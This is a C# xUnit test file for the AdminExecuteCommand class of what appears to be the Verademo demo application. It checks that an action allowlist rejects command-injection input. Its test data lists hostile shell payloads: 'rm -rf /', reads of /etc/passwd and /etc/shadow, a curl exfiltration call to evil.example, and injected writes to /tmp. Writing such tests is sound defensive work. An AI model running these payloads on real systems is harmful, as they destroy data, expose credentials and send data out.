using System;
using Verademo.Commands;
using Xunit;

namespace Verademo.Tests
{
    /// <summary>
    /// Tests for <see cref="AdminExecuteCommand"/> verifying that:
    ///   1. Only allowlisted action names are accepted.
    ///   2. Command-injection payloads (shell metacharacters, chained commands,
    ///      path traversal, etc.) are rejected before any process is started.
    ///   3. The class throws <see cref="InvalidOperationException"/> for every
    ///      non-allowlisted input, not an OS-level error caused by actual execution.
    /// </summary>
    public class AdminExecuteCommandTests
    {
        // -----------------------------------------------------------------------
        // Helper
        // -----------------------------------------------------------------------

        /// <summary>
        /// Assigns <paramref name="action"/> to <see cref="AdminExecuteCommand.Action"/>
        /// and returns any exception thrown by the setter (which calls Exec internally).
        /// Returns null when no exception is raised.
        /// </summary>
        private static Exception? AssignAction(string action)
        {
            try
            {
                var cmd = new AdminExecuteCommand();
                cmd.Action = action;
                return null;
            }
            catch (Exception ex)
            {
                return ex;
            }
        }

        // -----------------------------------------------------------------------
        // Allowlist acceptance – allowed values should NOT throw InvalidOperationException.
        // Note: on CI the underlying executables (/usr/bin/systemctl, /usr/bin/uptime,
        //       /usr/bin/uname) may or may not be present, so we only assert that the
        //       exception is NOT an allowlist rejection (InvalidOperationException with
        //       "not permitted" message). A missing-executable Win32Exception is acceptable.
        // -----------------------------------------------------------------------

        [Theory]
        [InlineData("status")]
        [InlineData("health")]
        [InlineData("version")]
        public void AllowedAction_DoesNotThrowAllowlistRejection(string allowedAction)
        {
            var ex = AssignAction(allowedAction);

            // The only acceptable outcomes are:
            //   a) No exception (process started successfully), or
            //   b) An OS-level error because the executable is absent in this environment.
            // An InvalidOperationException with "not permitted" means the allowlist rejected
            // a value it should have accepted – that is a test failure.
            if (ex is InvalidOperationException ioe && ioe.Message.Contains("not permitted"))
            {
                Assert.Fail(
                    $"Allowlisted action '{allowedAction}' was incorrectly rejected by the " +
                    $"allowlist check. Message: {ioe.Message}");
            }
        }

        // -----------------------------------------------------------------------
        // Allowlist rejection – shell injection payloads and arbitrary strings.
        // -----------------------------------------------------------------------

        [Theory]
        // Classic shell metacharacter injection
        [InlineData("; rm -rf /")]
        [InlineData("& whoami")]
        [InlineData("| cat /etc/passwd")]
        [InlineData("`id`")]
        [InlineData("$(id)")]
        // Command chaining
        [InlineData("status; reboot")]
        [InlineData("health && curl http://evil.example/exfil")]
        // Newline / null-byte injection attempts (expressed as escape sequences,
        // never as raw control bytes, to keep the file valid UTF-8 source)
        [InlineData("status\nreboot")]
        [InlineData("health\x00injected")]
        // Arbitrary commands
        [InlineData("reboot")]
        [InlineData("/bin/sh")]
        [InlineData("/usr/bin/id")]
        [InlineData("cat /etc/shadow")]
        // Empty / whitespace
        [InlineData("")]
        [InlineData("   ")]
        // Lookalike with leading/trailing spaces (must not bypass allowlist)
        [InlineData(" status")]
        [InlineData("status ")]
        [InlineData(" health ")]
        // Case variations (allowlist is case-sensitive)
        [InlineData("Status")]
        [InlineData("STATUS")]
        [InlineData("Health")]
        [InlineData("VERSION")]
        public void DisallowedAction_ThrowsInvalidOperationException(string maliciousAction)
        {
            var ex = AssignAction(maliciousAction);

            Assert.NotNull(ex);
            Assert.IsType<InvalidOperationException>(ex);
            Assert.Contains("not permitted", ex.Message, StringComparison.OrdinalIgnoreCase);
        }

        // -----------------------------------------------------------------------
        // Verify that the exception is raised BEFORE any process is started
        // (i.e. the check is at the allowlist boundary, not after shell execution).
        // -----------------------------------------------------------------------

        [Fact]
        public void InjectionPayload_ExceptionImmediatelyFromAllowlistNotFromOS()
        {
            // If the original vulnerable code path were still present, passing a shell
            // payload would either succeed (executing the injected command) or fail with
            // an OS/Win32 error. With the fix, it must fail with InvalidOperationException
            // BEFORE any process.Start() call is made.
            const string payload = "; echo injected > /tmp/pwned";

            var ex = AssignAction(payload);

            // Must be our own allowlist rejection, not an OS-level failure.
            Assert.IsType<InvalidOperationException>(ex);
            Assert.Contains("not permitted", ex!.Message, StringComparison.OrdinalIgnoreCase);
        }

        // -----------------------------------------------------------------------
        // Property round-trip: reading Action back after a rejected assignment.
        // -----------------------------------------------------------------------

        [Fact]
        public void Action_Getter_ReturnsAssignedValue_EvenWhenRejected()
        {
            // The setter must still persist the value to _action (for observability),
            // even though Exec() throws. The throw happens inside the setter after the
            // assignment – callers can catch it and inspect Action.
            const string payload = "malicious";
            var cmd = new AdminExecuteCommand();

            try { cmd.Action = payload; }
            catch (InvalidOperationException) { /* expected */ }

            Assert.Equal(payload, cmd.Action);
        }

        // -----------------------------------------------------------------------
        // Null input: should throw before attempting any process.
        // -----------------------------------------------------------------------

        [Fact]
        public void NullAction_ThrowsInvalidOperationException()
        {
            var cmd = new AdminExecuteCommand();

            // null is not in the allowlist; the check must reject it.
            var ex = Record.Exception(() => { cmd.Action = null!; });

            // Either InvalidOperationException (allowlist) or ArgumentNullException
            // is acceptable; what is NOT acceptable is the process starting.
            Assert.NotNull(ex);
            Assert.True(
                ex is InvalidOperationException || ex is ArgumentNullException,
                $"Expected InvalidOperationException or ArgumentNullException but got {ex.GetType().Name}: {ex.Message}");
        }
    }
}
